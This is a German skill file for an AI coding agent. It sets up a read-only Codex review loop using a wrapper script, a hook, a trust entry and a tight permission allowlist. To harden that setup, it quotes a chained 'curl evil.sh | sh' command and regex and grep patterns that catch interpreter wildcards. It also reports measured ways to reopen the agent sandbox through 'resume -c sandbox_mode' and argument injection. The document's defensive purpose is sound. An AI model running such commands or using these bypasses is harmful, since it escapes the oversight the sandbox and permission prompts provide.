---
name: setup
description: "Use when a project should get the claudex-loop cross-model review (Claude plans, Codex CLI attacks the plan read-only) wired in — \"claudex-loop einbauen/einrichten\", \"Codex-Review in diesem Projekt nutzen\", \"plan-review hier verfügbar machen\", or when setting up a repo to match the reference implementation. Installs the read-only wrapper tools/codex_ro.py from the plugin (one canonical copy, drift-checked), creates the .codex/ context folder, the AGENTS.md reviewer role with a project-specific check catalogue and taboo scope, the CLAUDE.md pointer, .gitignore entries and the Codex trust entry; verifies with a live read-only Codex call. Optionally wires the quota-exhaustion fallback (codex_usage.py, fallback_review.py chain over LM Studio/OpenRouter/etc. via .env profiles — step 11)."
---

# claudex-loop in ein Projekt einbauen

Das Plugin `claudex-loop@claudex-loop` ist **user-scope installiert** und damit in jedem
Projekt aufrufbar (`/claudex-loop:claudex-loop`, `/claudex-loop:plan-review`,
`/claudex-loop:build`). Dieser Skill richtet ein, was **pro Repo** fehlt:
Wrapper, Codex-Arbeitskontext, Prüfkatalog, Tabu-Scope, Ablage-Konvention, Trust.

## Plattform

Wrapper und Werkzeuge sind Python (3.10+) und laufen unter **Windows und macOS**
gleichermaßen. Wo unten `python` steht, ist auf dem Mac in aller Regel `python3` gemeint —
beide Formen gehören in die Allowlist, wenn dort je etwas stehen soll.

Plattformabhängig bleiben nur zwei Dinge: der Trust-Eintrag in `~/.codex/config.toml`
(Pfadschreibweise) und `cygpath`, das ausschließlich Git Bash unter Windows kennt. Der
Wrapper braucht `cygpath` nicht — er normalisiert Pfade selbst.

## ⛔ Zuerst lesen: die verifizierte Betriebsanleitung

`${CLAUDE_PLUGIN_ROOT}/docs/betrieb.md` (im Repo: `docs/betrieb.md`)

Dort steht, was gegen `codex-cli 0.149.1` **gemessen** wurde — und was der Wrapper davon
selbst erledigt. Der Plugin-README des Originals ist an mehreren Stellen falsch für diese
Umgebung; nicht daraus zitieren, ohne die Datei gelesen zu haben. Als
Referenz-Implementierung eines eingerichteten Repos dient das größte bereits eingerichtete
Projekt (`AGENTS.md` „Rolle: Plan-Reviewer", `CLAUDE.md` „Plan-Härtung"); eine kleinere
Variante existiert daneben.

Die drei Korrekturen, die am meisten kosten, wenn man sie nicht kennt:

| Plugin-README sagt | Verifiziert gilt |
| --- | --- |
| „Don't pin a model" | **Doch pinnen:** `-m gpt-5.6-terra -c model_reasoning_effort="high"`. Der Pin läuft unter ChatGPT-Auth einwandfrei; die Warnung zielt auf die alten `*-codex`-Slugs. ⛔ **Nicht `sol`** — reißt an echten Plänen das 10-Minuten-Ceiling (exit 143). Ausnahme: der Exposure-Pass von `code-review`/`audit` läuft bewusst auf `sol`/`medium` (Rolle `exposure-review`, begrenzter Input). |
| Plan als Datei, Codex liest ihn | **Plantext inline in den Prompt.** Codex' Shell-Aufrufe können per Policy blockiert werden und eine frische `PLAN.md` ist oft untracked — dann reviewt Codex den Code, aber nicht den Plan. |
| `2>/dev/null` | **stderr in eine Datei.** Ein abgelaufener Token liefert exit 0, gültige `thread_id` und eine *leere* Verdict-Datei; der 401 steht nur in stderr. |

Vier weitere Fallen — Pfadnormalisierung (das Windows-Binary versteht keine
Git-Bash-Pfade), EOF auf stdin (sonst hängt `codex exec` ohne TTY), Timeout-Decke und
MCP-Abschaltung je Server (`-c mcp_servers="{}"` wirkt **nicht**) — erledigt der Wrapper
selbst. Man muss sie kennen, um zu verstehen, warum er existiert; von Hand machen muss man
sie nicht. Einzige Ausnahme: das **Bash-Tool-Timeout** gehört auf `600000` ms gesetzt, das
kann kein Skript für dich tun.

## Was am Ende dastehen muss

| Baustein | Zweck |
| --- | --- |
| `AGENTS.md` (Repo-Root) | Codex' Betriebsanleitung — lädt Codex CLI automatisch aus dem Root. Pendant zu `CLAUDE.md`, aber ohne Verweise auf Claude-Skills/-Agenten: fachliche Regeln ausgeschrieben. |
| `AGENTS.md` → „Rolle: Plan-Reviewer" | **Prüfkatalog + Tabu-Scope** für `plan-review` — das inhaltliche Herzstück |
| `AGENTS.md` → „Rolle: Abnahme-Prüfer" | Maßstäbe für `code-review` je Dimension (DoD, Quality, Security, Docs, Tests) |
| `AGENTS.md` → „Wer welchen Schritt macht" | Zeiger auf `.claudex.yaml` und die beiden Sperren |
| `AGENTS.md` → Aufruf-Konventionen | Ablage, Modell-Pin, Verweis auf `docs/betrieb.md` |
| `.claudex.yaml` (nur bei Abweichung) | Rollen-Zuordnung, wenn dieses Repo nicht dem Default folgt |
| `.codex/README.md` + `knowledge.md` | Ordnerzweck + manuell gepflegtes Memory-Substitut |
| `CLAUDE.md` → Zeiger | damit Claude den Loop von sich aus vorschlägt |
| `.gitignore` | transiente `/PLAN.md`, `/PLAN-REVIEW-LOG.md` im Root |
| `~/.codex/config.toml` → `[projects.'<pfad>']` | `trust_level = "trusted"` |
| `.claude/settings.local.json` | **nichts freistellen ausser `Bash(codex --version)`** — auch den Wrapper nicht, solange der Hook nicht verifiziert ist (Schritt 0b). UND: vorhandene Interpreter-Wildcards schliessen, sonst ist jede Regel daneben Dekoration (Schritt 0) |
| `tools/codex_ro.py` | Wrapper, der read-only hart setzt. **Kopie**, nie Handarbeit — kanonisch liegt er im Plugin unter `scripts/codex_ro.py` |
| Drift-Pruefung | `python "${CLAUDE_PLUGIN_ROOT}/scripts/wrapper_drift.py" --repo .` — meldet eine zurueckliegende Kopie, `--update` hebt sie an |
| PreToolUse-Hook | kommt aus dem Plugin (`hooks/wrapper_guard.py`), nichts pro Repo einzutragen — aber **verifizieren**, bevor man sich darauf beruft |
| `tools/codex_usage.py` + `tools/fallback_review.py` (optional) | Kontingent-Ausfall: Quota-Reader + Fallback-Reviewer-Kette über `.env`-Profile (Schritt 11) |

## Ablauf

### Schritt 0 (PFLICHT, vor allem anderen): bestehende Freigaben pruefen

⛔ **Eine enge `codex`-Regel ist wertlos, solange irgendeine Interpreter-Wildcard danebensteht.**
`Bash(*)`, `Bash(powershell:*)`, `Bash(python:*)`, `Bash(python -c *)`, `Bash(node -e:*)`,
`Bash(cmd /c:*)` — jede davon startet beliebigen Code und damit auch `codex exec` mit
beliebiger Sandbox. Am 27.08.2026 hatten **5 von 21** bereits eingerichteten Repos genau
das, eines davon ein nacktes `Bash(*)` — die sorgfaeltig verengte `codex`-Zeile daneben war
reine Dekoration.

```bash
python - <<'PY'
import io, json, os, re, glob
LOCH = re.compile(r'^(Bash|PowerShell)\((\*\)$|(powershell|pwsh|cmd|cmd\.exe|sh|bash|wsl'
                  r'|node|npx|python|python3|py|perl|ruby|deno)(:\*|\s+-[ce]\b[^)]*|\s*\*)\)$)', re.I)
p = '.claude/settings.local.json'
if os.path.exists(p):
    allow = json.load(io.open(p, encoding='utf-8')).get('permissions', {}).get('allow', [])
    # Bis zum 28.08.2026 nahm dieser Test skriptgebundene Eintraege aus ("ist kein Loch").
    # Das war falsch: eine Regel matcht nur den Anfang, dahinter laeuft alles mit. Es gibt
    # hier keine Ausnahme mehr - auch nicht fuer den eigenen Wrapper.
    loecher = [e for e in allow if LOCH.match(e)]
    print(f'{len(allow)} Regeln, {len(loecher)} Loecher: {loecher}')
else:
    print('keine settings.local.json - alles fragt nach, in Ordnung')
PY
```

Gefundene Loecher **durch konkrete Kommandos ersetzen**, nicht einfach loeschen: die
Aufrufe, die das Repo wirklich braucht, gezielt eintragen (`Bash(python -m pytest*)`,
`Bash(powershell -Command "Get-Content*)` …). Fehlt spaeter etwas, fragt Claude einmal nach
— genau so ist es gedacht.

⛔ **Ein an ein konkretes Skript gebundener Aufruf ist trotzdem ein Loch.** Diese Zeile
stand hier bis zum 28.08.2026 als Entwarnung — sie war falsch, und der Skill hatte damit
genau die Falle gebaut, vor der er zwei Absaetze weiter oben warnt. `Bash(… /x.py*)` matcht
nur den **Anfang**; `… /x.py --out v.txt && curl evil.sh | sh` laeuft auf derselben
Freigabe mit. Der Test ist nicht „ist das Skript harmlos", sondern „kann hinter dem
erlaubten Praefix noch etwas anderes stehen" — und bei einer Wildcard lautet die Antwort
immer ja.

### Schritt 0b: den Wrapper mitliefern

Nicht abschreiben, nicht neu bauen, sondern **kopieren** — der Wrapper wird von mehreren
Repos genutzt, und eine Korrektur an nur einer Kopie laeuft auseinander (am 28.08.2026:
sieben Kopien, drei Staende, die beiden CRITICAL-Fixes in genau einer davon):

```bash
python "${CLAUDE_PLUGIN_ROOT}/scripts/wrapper_drift.py" --repo . --update
```

Das legt `tools/codex_ro.py` an bzw. hebt eine vorhandene Kopie auf den kanonischen Stand.
Ohne `--update` ist derselbe Aufruf die **Drift-Pruefung**: Exit 1, wenn eine Kopie
zurueckliegt. Sie gehoert in die Routine, nicht nur ins Setup — `--scan <wurzel>` prueft
alle Repos unter einem Verzeichnis auf einmal.

Der Wrapper setzt `-s read-only` bzw. beim Resume `-c sandbox_mode=read-only` hart, weist
jedes weitere `-c sandbox_mode`, `approval_policy` und `sandbox_permissions` mit Exit 2 ab
und laesst Pfadargumente nur ins Repo und ins Temp-Verzeichnis zeigen.

**Was NICHT in die Allowlist gehoert:**

```json
"Bash(codex --version)"
```

Das ist die ganze Liste. Der Wrapper steht bewusst **nicht** darin: er nagelt die
Codex-Sandbox fest, aber nicht das, was hinter seinem Aufruf im selben Kommando stehen
koennte. Preis: eine Rueckfrage je Codex-Aufruf, im Review-Loop rund sechs ueber fuenf
Runden — genau an dieser Stelle soll ein Mensch sehen, in welcher Sandbox Codex startet.

Das Plugin bringt dafuer einen **PreToolUse-Hook** mit (`hooks/wrapper_guard.py`), der
einen Wrapper-Aufruf mit Verkettung, Pipe, Umleitung oder Kommandosubstitution abweist.
Erst **wenn der nachweislich greift** — im Zielrepo einmal ein verkettetes Kommando
absetzen und sehen, dass es abgelehnt wird — darf der Eintrag zurueck:

```json
"Bash(python tools/codex_ro.py*)",
"Bash(python3 tools/codex_ro.py*)",
"PowerShell(python tools\\codex_ro.py*)"
```

Nicht auf den Hook berufen, ohne ihn im laufenden Setup gesehen zu haben. Ein Hook, der
aus irgendeinem Grund nicht laedt, ist von einem fehlenden Hook nicht zu unterscheiden —
ausser durch den Versuch.

⚠️ Der Wrapper braucht ein **Git-Verzeichnis** als Arbeitsverzeichnis, sonst verweigert
Codex mit „Not inside a trusted directory“.


### 1. Voraussetzungen (einmal pro Rechner)

```bash
codex --version        # >= 0.130; Stand 08/2026: 0.149.1
codex login status     # "Logged in using ChatGPT" — Abo, kein API-Key
```

Fehlt Codex: `npm install -g @openai/codex@latest`, dann `codex login`.
`~/.codex/config.toml` Sollzustand: `model = "gpt-5.6-terra"`,
`model_reasoning_effort = 'medium'` (Alltag; die Angriffsrunde hebt das per `-c` an).
⛔ `gpt-5.4`/`-mini` verschwinden am 31.08.2026 aus Codex.

### 2. Bestandsaufnahme im Ziel-Repo

Was existiert schon (`AGENTS.md`, `.codex/`, `CLAUDE.md`, `.gitignore`), wo liegen Pläne
üblicherweise (`docs/superpowers/plans/` oder `_todos/plaene/<slug>/`)?
**Vorhandene Dateien ergänzen, nie überschreiben.**

Dann das Repo tatsächlich ansehen — Verzeichnisbaum, `README`, Tests, Migrations,
letzte Commits. Ohne das werden Schritt 3 und 4 generisch und damit wertlos.

### 3. Tabu-Scope bestimmen — die wichtigste Entscheidung

⛔ **Read-only heißt: Codex *schreibt* nicht. Alles, was es *liest*, geht an OpenAI.**

Konkret auflisten, was Codex nicht öffnen darf — mit Begründung, was drinsteht. Typisch:
`.env*`, Token-/Credential-Dateien, `data/`, Kundenordner, `_bak/`, DB-Verbindungslisten.
Auch **gitignorierte** Dateien prüfen: die liegen auf der Platte und sind lesbar.
Gegenstück nennen, was freigegeben ist (`.env.example`, `src/`, `tests/`, Doku), sonst
wird der Reviewer übervorsichtig.

Der Scope gehört an **zwei** Stellen: in `AGENTS.md` (Codex liest sie automatisch) und
in die `CLAUDE.md` (damit Claude ihn im Review-Prompt wiederholt). Nicht darauf
vertrauen, dass Codex von selbst wegschaut.

### 4. Prüfkatalog schreiben — projektspezifisch, nicht generisch

Der Reviewer-Abschnitt in `AGENTS.md` (Vorbild: `s100-scripte`) beginnt mit der Rolle:

> Wirst du über `codex exec -s read-only` mit einem Plan gerufen, bist du der
> **gegnerische Gutachter**, nicht der Umsetzer. Auftrag: den Plan angreifen. Lob hilft
> niemandem — jeder Befund braucht einen konkreten Aufhänger (Datei, Zeile oder eine der
> Regeln unten) und die Angabe, was **konkret schiefgeht**, wenn der Plan so bleibt.

Danach 6–10 nummerierte Prüfpunkte, die aus **diesem** Repo stammen: die Fallstricke, die
hier schon einmal weh getan haben (Git-Log und `.codex/knowledge.md` liefern sie),
Kompatibilitätsgrenzen, geteilte Abhängigkeiten zu Nachbarprojekten, Reihenfolge beim
Ausrollen. Ein Punkt, der in jedem Repo funktionieren würde, gehört nicht in die Liste.

Zwei Punkte lohnen fast überall:
- **Geteilte Abhängigkeiten** — hängt ein Schwesterprojekt an derselben Token-/DB-/
  Konfig-Basis? Fehlt die Aussage im Plan, ist das ein Befund.
- **Zahlen** — sind Mengenangaben nachgemessen oder geschätzt? Geschätzte Zahlen, die wie
  gemessene aussehen, sind ein Befund.

### 5. Aufruf-Konventionen in `AGENTS.md`

Wann einsetzen (wo ein Denkfehler *im Plan* später Deployment, Datenverlust oder
Neu-Builds kostet) und wann nicht (Einzeiler, reine Doku, alles unter ~30 Minuten).

Ablage festlegen und **beides committen** — Plan *und* Review-Log. Der Log ist der
Nachweis, warum eine Entscheidung so und nicht anders fiel:

```
/claudex-loop:plan-review
    PLAN_FILE=<plan-ordner>/JJJJ-MM-TT-<thema>.md
    LOG_FILE=<plan-ordner>/JJJJ-MM-TT-<thema>-review-log.md
```

Modell-Pin und den Verweis auf die Windows-Abweichungen (Pfad aus dem Kopf dieses Skills)
mit aufnehmen.

### 6. `.codex/` anlegen

`README.md`: Ordnerzweck (ergänzt `AGENTS.md`, die Codex automatisch aus dem Root lädt),
Hinweis auf das fehlende Memory, Verweis auf den Reviewer-Abschnitt.

`knowledge.md`: Digest des Claude-Memory-Stands aus
`D:\Dokumente\Projekte\_claude\memory\<slug>\MEMORY.md`, zu Stichpunkten verdichtet.
Gibt es dort nichts, den Pfad trotzdem als **Live-Quelle-zuerst-Hinweis** in den Kopf
schreiben, damit ein später angelegter Memory-Ordner nicht übersehen wird.

### 7. `CLAUDE.md` ergänzen

Kurzer Zeiger: wann einsetzen, Tabu-Scope in einem Satz, Ablage, Modell-Pin, und dass
Prüfkatalog und Details in `AGENTS.md` stehen. Nicht duplizieren — zwei Quellen driften.

### 8. `.gitignore`

```
# claudex-loop Arbeitsdateien im Repo-Root (transient).
# Endgueltige Plaene + Review-Logs gehoeren nach <plan-ordner>.
/PLAN.md
/PLAN-REVIEW-LOG.md

# Zwischenablage der Skills (SCRATCH_DIR-Rueckfall, wenn der Harness
# kein eigenes Scratchpad stellt). Enthaelt Codex-Rohausgaben und
# Scanner-Reports - nie committen. NIE nach /tmp ausweichen: weltlesbar,
# und unter macOS ein Symlink auf /private/tmp, was den Pfadabgleich
# gegen `git rev-parse --show-toplevel` bricht.
/.claudex-tmp/
```

### 9. Trust-Eintrag in `~/.codex/config.toml`

```toml
[projects.'d:\dokumente\projekte\...\<repo>']
trust_level = "trusted"
```

Pfad **kleingeschrieben** wie die bestehenden Einträge. Nötig für die interaktive
Codex-TUI und für `build` mit Schreibrechten; `codex exec -s read-only` läuft auch
ohne. Deshalb **immer aus dem Repo-Root starten** — nur dieser Pfad ist trusted, und nur
dort findet Codex die `AGENTS.md`.

⚠️ Die Datei liegt außerhalb des Projekts: im Auto-Mode blockiert der Klassifizierer den
Schreibzugriff **wortlos**. Dann den Nutzer um Freigabe bitten, statt den Eintrag
stillschweigend wegzulassen. Die Datei enthält MCP-Header mit Klartext-Token — gezielt
patchen, nichts davon ins Log oder in eine Antwort kopieren.

### 10. Verifizieren (Pflicht, kein „müsste jetzt gehen")

Der Ping läuft über den Wrapper — wie jeder andere Codex-Aufruf auch. `docs/betrieb.md`
sagt das als Regel: **„Auch Ping und Resume laufen über den Wrapper."** Bis zum Audit am
30.08.2026 stand hier trotzdem ein direkter `codex exec`, und damit prüfte der
Verifikationsschritt eine Konfiguration, die im echten Betrieb gar nicht verwendet wird.

```bash
printf 'Antworte nur mit: PING-OK\n' > "$SCRATCH_DIR/ping.txt"
python tools/codex_ro.py --effort low --timeout 120 \
  --prompt-file "$SCRATCH_DIR/ping.txt" \
  --out-file "$SCRATCH_DIR/ping-out.txt" \
  --err-file "$SCRATCH_DIR/ping-err.txt"
```

Erwartung: Exit 0, `THREAD_ID=…`, und `PING-OK` in `ping-out.txt`. Kein Trust-Prompt,
kein Sandbox-Fehler. Exit 2 = abgewiesen (Pfad oder `-c`), Exit 1 = leere Antwort trotz
Exit 0 beim Kind — der Auth-Fall, der Grund steht dann in `ping-err.txt`.

MCP-Server schaltet der Wrapper selbst ab, und zwar nur die, die diese Installation
wirklich konfiguriert hat: `-c mcp_servers.<name>.enabled=false` für einen **nicht**
vorhandenen Server erzeugt einen Server-Eintrag ohne `transport`, woraufhin Codex die
gesamte Config verweigert (Exit 1, leere Antwortdatei). Genau das hat dem Audit dieses
Repos die ersten vier Sessions gekostet.

Dann `git status` zeigen und die geänderten Dateien benennen. Commit nur auf Zuruf.

### 11. Fallback-Reviewer einrichten (optional, empfohlen)

Damit der Loop bei erschöpftem Codex-Kontingent nicht dead-endet (issue #7, unser
Fix: [PR #9](https://github.com/chaseai-yt/claudex-loop/pull/9)). Referenz-Repo ist
`s100-scripte`; volles Protokoll dort in `docs/betrieb.md` des Plugins → „Kontingent-Ausfall".

1. **Tools kopieren** — nicht von Hand, sondern mit demselben Werkzeug wie den
   Wrapper: `python "${CLAUDE_PLUGIN_ROOT}/scripts/wrapper_drift.py" --repo . --update`
   holt `codex_ro.py`; `--update-optional` zusätzlich `codex_usage.py` (Quota-Reader)
   und `fallback_review.py` (generischer Adapter — jeder OpenAI-kompatible Endpoint,
   Preflight `--check`, Provider-Kette `--chain`, optionaler Modell-Auto-Load für
   lokale Runtimes). ⚠️ `--update-optional` **überschreibt** eine lokal
   weiterentwickelte Kopie — vorher den Diff lesen; genau daran hing am 28.08.2026
   die Egress-Sperre eines Repos.

   Ein früher hier genannter LM-Studio-Spezialfall (`lms_review.py`) ist entfallen:
   sein einziger Vorsprung, der Modell-Auto-Load, steckt jetzt als Profil-Option im
   Adapter (`*_AUTOLOAD`, `*_CONTEXT`).
2. **`.env`-Profile** (gitignoriert! `.env` in `.gitignore` prüfen), Keys nie
   inline — `*_API_KEY_ENV` auf eine Env-Var zeigen lassen (Vault-Regel):

   ```text
   CLAUDEX_REVIEWERS=lmstudio,openrouter        # = Fallback-Kette, erster gewinnt
   CLAUDEX_REVIEWER_LMSTUDIO_BASE_URL=http://127.0.0.1:1234/v1
   CLAUDEX_REVIEWER_LMSTUDIO_MODEL=qwen/qwen3.8-27b
   CLAUDEX_REVIEWER_OPENROUTER_BASE_URL=https://openrouter.ai/api/v1
   CLAUDEX_REVIEWER_OPENROUTER_MODEL=deepseek/deepseek-r1
   CLAUDEX_REVIEWER_OPENROUTER_API_KEY_ENV=OPENROUTER_API_KEY
   ```

3. **Verifizieren:** `python tools/fallback_review.py --check` — je Provider
   Erreichbarkeit/Auth; OpenRouter zeigt echtes Restguthaben (`/credits`);
   OpenAI/Gemini/Anthropic haben keine Guthaben-API (402/429 bei Nutzung gilt
   als terminal, die Kette zieht weiter).
4. **Eckpunkte** (gelten immer): Wechsel nie automatisch/still — die
   `CLAUDEX_REVIEWERS`-Reihenfolge ist die Einwilligung, jeder Skip wird mit
   Grund ausgewiesen; Fallback-Runden im Log kennzeichnen
   (`## Round <n> — <Modell> (via <reviewer>, fallback)`); Runde-1-APPROVED mit
   < 3 Befunden = ungültig; Verdict ist an den Plan-SHA256 gebunden.
5. **LM Studio lokal**: Service standardmäßig auf Port 1234. Als Reviewer taugt
   erst ein Modell ab ~27B (Q4; auf einer iGPU ~4–8 min je Review-Runde), ein
   kleineres ist nur Notnagel. Side-Loads gehören in den Modellordner, den
   LM Studio tatsächlich indexiert (in den Einstellungen nachsehen — ist er
   umgestellt, ist `~/.lmstudio/models` tot). Das RAM-Budget vor dem Laden prüfen;
   `AUTOLOAD`/`CONTEXT` im Profil sorgen dafür, dass das Modell mit passendem
   Fenster steht, bevor die Runde beginnt.

## Mehrere Projekte auf einmal

Schritt 3–5 und 7 sind **inhaltlich projektspezifisch** und dürfen nicht per Copy&Paste
generisch bleiben — ein Prüfkatalog, der überall passt, findet nirgends etwas. Nur
Schritt 8 und 9 sind reine Mechanik.

Bei vielen Repos pro Repo einen Subagenten mit dem Auftrag, diesen Skill zu lesen und
Schritt 2–8 auszuführen. Schritt 9 (`~/.codex/config.toml`) zentral **einmal am Ende**
sammeln: paralleles Anhängen an dieselbe Datei erzeugt Konflikte.

## Bekannte Stolpersteine

- **Codex per Allowlist freistellen** → praktisch beliebige Codeausfuehrung. Bash-Regeln
  matchen nur den **Anfang** des Kommandos; was danach kommt, faengt keine Regel mehr ein.
  Also hoechstens `Bash(codex --version)` freigeben; jeder `exec`-Aufruf fragt dann einmal
  nach (Review-Loop: ~6 Rueckfragen ueber 5 Runden). Das ist der Preis dafuer, dass sichtbar
  bleibt, in welcher Sandbox Codex startet — und die Build-Phase ist genau die Stelle,
  an der ein Mensch hinsehen soll. Am 26.08.2026 in `Vimeo_Downloader` zweimal von der
  Commit-Sicherheitspruefung gemeldet, bis es sass. **Den Grund im Repo festhalten**, sonst
  traegt die naechste Sitzung die bequeme Zeile wieder ein.

  ⚠️ **Praezisierung 27.08.2026 (gemessen, nicht vermutet).** Die frueher hier stehende
  Begruendung — „ein nachgestelltes `-c sandbox_mode` passiert jeden `codex exec`-Praefix“
  — stimmt nur zur Haelfte. Gemessen mit `codex-cli 0.149.1`, jeweils Schreibversuch in ein
  leeres Git-Verzeichnis, **mit Positivkontrolle** (ohne die waere „FAILED“ wertlos, weil es
  auch heissen koennte, dass die Probe nie schreibt):

  | Aufruf | schreibt? | heisst |
  |---|---|---|
  | `exec -s read-only` | nein | Basislinie |
  | `exec -s read-only -c sandbox_mode="danger-full-access"` | **nein** | **`-s` gewinnt gegen nachgestelltes `-c`** |
  | `exec -s danger-full-access` | ja | Positivkontrolle — die Probe erkennt eine offene Sandbox |
  | `resume -c sandbox_mode="read-only" -c sandbox_mode="danger-full-access"` | **ja** | **spaeteres `-c` gewinnt** |

  Also: bei `codex exec` mit explizitem `-s read-only` ist der Modus **nicht** mehr
  aufreissbar — dort waere eine Praefix-Regel technisch dicht. Bei `codex exec resume` gibt
  es kein `-s`, der Modus haengt allein an `-c`, und das letzte gewinnt — dort ist **keine**
  Praefix-Regel dicht. Die Empfehlung „nichts freistellen“ bleibt trotzdem: sie deckt beide
  Faelle mit einer Entscheidung ab, und der `resume`-Fall ist real aushebelbar.

  ⛔ **Der groessere Fehler ist eine Wildcard-Freigabe.** `Bash(*)`, `PowerShell(*)`,
  `Bash(powershell:*)`, `Bash(cmd.exe:*)` oder `Bash(cmd /c:*)` erlauben jeden Codex-Aufruf
  mit beliebiger Sandbox — dann ist die enge `codex`-Regel danebendran wirkungslos. Vor dem
  Berufen auf die Regel pruefen:
  `grep -nE '"(Bash|PowerShell)\(\*\)"|"Bash\((powershell|cmd|cmd\.exe)' .claude/settings.local.json`

  Wer die Rueckfragen wirklich los will, braucht **zwei** Dinge, nicht eines: ein
  Wrapper-Skript, das `-s read-only` bzw. beim Resume `-c sandbox_mode=read-only` hart
  setzt und jedes weitere `-c sandbox_mode` / `approval_policy` verwirft — **und** einen
  Hook, der verhindert, dass hinter dem freigegebenen Praefix ein zweites Kommando steht.
  Der Wrapper allein genuegt nicht; genau dieser Denkfehler stand bis zum 28.08.2026 in
  diesem Skill. Beides liegt im Plugin: `scripts/codex_ro.py` und `hooks/wrapper_guard.py`.

  Der Wrapper ist Python, nicht PowerShell — plattformneutral, und `subprocess` baut die
  Argumentliste, statt eine Kommandozeile zusammenzusetzen, womit die Argument-Injektion
  als Fehlerklasse entfaellt. Die PowerShell-Fassung davor hatte genau daran zwei
  CRITICAL-Befunde: `-ArgumentList` quotet nicht, also konnte ein Wert mit Leerzeichen in
  `-Model` oder `-c` ein zusaetzliches Argument einschleusen — auf dem `resume`-Pfad, wo
  kein `-s` dagegenhaelt, waere die Sandbox aufgegangen.

  Zwei Windows-Fallen bleiben und stecken im Wrapper drin: der npm-Shim `codex` ist
  **endungslos** und nicht startbar (es braucht `codex.cmd`), und ein absoluter Pfad darf
  nicht noch einmal ans Arbeitsverzeichnis gejoint werden. Der Prompt geht ueber **stdin** —
  das loest das Quoting und liefert zugleich das EOF, ohne das `codex exec` ohne TTY haengt.
- **`sol` statt `terra`** → Timeout (exit 143) an echten Plänen. `terra`/high liefert
  dieselbe Schärfe in 1–2 Minuten je Runde.
- **`resume` kennt kein `-s`** → read-only beim Resume nur über
  `-c sandbox_mode="read-only"`, sonst erbt der Resume den `config.toml`-Default
  (u. U. `danger-full-access`).
- **`build` ohne sauberen Git-Baum** → nicht startbar, nicht rückrollbar.
- **`MAX_ROUNDS` erreicht ist kein Misserfolg.** Aussagekräftiger als das Verdikt ist die
  **Fundkurve** (z. B. 11 → 9 → 5 → 5 → 1) plus die Frage, wie viele Funde man begründet
  zurückweisen konnte.
- **`.codex/knowledge.md` veraltet still** — kein Sync mit dem Claude-Memory-Store. Bei
  größeren Änderungen an einer Seite die andere nachziehen.
- **Codex-Kontingent erschöpft ≠ Dead-End** (upstream issue #7; unser Fix als
  PR eingereicht: [chaseai-yt/claudex-loop#9](https://github.com/chaseai-yt/claudex-loop/pull/9)):
  Restkontingent lokal abfragen (`python tools/codex_usage.py` liest die
  `rate_limits`-Snapshots aus `~/.codex/sessions/…/rollout-*.jsonl`:
  5-h-/Wochenfenster, `used_percent`, Reset-Zeit), dann entscheidet der NUTZER:
  warten bis Reset, **Fallback-Reviewer** (s. Schritt 11), ODER Review-Phase mit
  explizitem Log-Eintrag überspringen („Plan nicht cross-reviewed"). Vor Runde 1
  prüfen; Erkennung im Lauf über die stderr-Datei (429/„usage limit" — auch
  deshalb nie `2>/dev/null`; ein 401/429 tarnt sich als exit 0 + leere
  Verdict-Datei). Volles Protokoll: `docs/betrieb.md` des Plugins → „Kontingent-Ausfall".
